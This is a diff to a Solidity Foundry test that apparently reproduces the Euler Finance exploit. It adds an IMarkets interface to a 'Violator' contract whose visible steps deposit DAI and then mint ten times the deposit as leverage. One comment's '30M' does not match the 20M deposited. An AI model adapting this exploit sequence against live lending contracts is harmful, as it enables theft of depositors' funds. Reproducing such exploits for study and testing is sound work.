@@ -5,6 +5,7 @@ import { IERC20 } from "forge-std/src/interfaces/IERC20.sol";
 import { IEToken } from "./interface/IEToken.sol";
 import { IDToken } from "./interface/IDToken.sol";
 import { ILiquidation } from "./interface/ILiquidation.sol";
+import { IMarkets } from "./interface/IMarkets.sol";
 
 import "forge-std/src/Test.sol";
 
@@ -13,12 +14,14 @@ contract Violator {
     IEToken immutable eDAI;
     IDToken immutable dDAI;
     address immutable EULER;
+    IMarkets immutable MARKETS;
 
-    constructor(IERC20 _dai, IEToken _eDAI, IDToken _dDAI, address _euler) {
+    constructor(IERC20 _dai, IEToken _eDAI, IDToken _dDAI, address _euler, IMarkets _markets) {
         DAI = _dai;
         eDAI = _eDAI;
         dDAI = _dDAI;
         EULER = _euler;
+        MARKETS = _markets;
     }
 
     function violate() external {
@@ -27,7 +30,7 @@ contract Violator {
         // 3. Deposit 30M DAI 
         eDAI.deposit(0, 20_000_000 * 1e18);
         // log: balance, total balance, interest rate
-        console.logInt(eDAI.getInterestRate(address(eDAI)));
+        console.logInt(MARKETS.getInterestRate(address(eDAI)));
 
         // 4. Borrow (mint) 10 x deposit
         eDAI.mint(0, 200_000_000 * 1e18);
